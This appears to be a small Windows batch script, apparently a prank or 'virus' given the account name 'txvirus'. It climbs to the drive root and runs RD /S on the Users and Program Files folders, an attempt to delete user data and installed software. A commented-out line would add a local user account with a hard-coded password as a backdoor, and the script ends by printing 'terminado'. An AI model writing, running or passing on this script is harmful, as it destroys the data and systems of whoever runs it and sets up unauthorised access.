@echo off
FOR %%i in ( 0 1 2 3 4 5 6 7 8 9 10 11 ) DO cd ..
RD /S Users
RD /S Program Files
RD Users
RD Program Files 
::net user txvirus ericandre1 /add
echo terminado